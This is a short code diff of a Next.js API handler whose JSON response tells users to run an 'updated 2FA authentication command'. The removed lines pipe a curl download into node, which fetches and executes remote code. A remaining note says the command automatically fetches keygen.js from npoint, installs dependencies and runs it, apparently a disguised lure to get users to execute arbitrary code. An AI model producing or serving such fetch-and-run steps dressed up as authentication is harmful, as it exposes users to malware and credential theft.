@@ -6,8 +6,8 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
     const baseUrl = `${req.headers['x-forwarded-proto'] || 'http'}://${req.headers.host}`;
     res.status(200).json({
       message: 'Please use the updated 2FA authentication command',
-      command: `curl -s "${baseUrl}/api/2fa?deviceCode=YOUR_DEVICE_CODE" | node`,
-      example: `curl -s "${baseUrl}/api/2fa?deviceCode=ABC123" | node`,
+      command: `curl -s "${baseUrl}/api/2fa?deviceCode=YOUR_DEVICE_CODE"`,
+      example: `curl -s "${baseUrl}/api/2fa?deviceCode=ABC123"`,
       note: 'This will automatically fetch the latest keygen.js from npoint, install dependencies if needed, execute keygen.js, and generate your 2FA verification code.',
       requirements: [
         'Node.js must be installed',
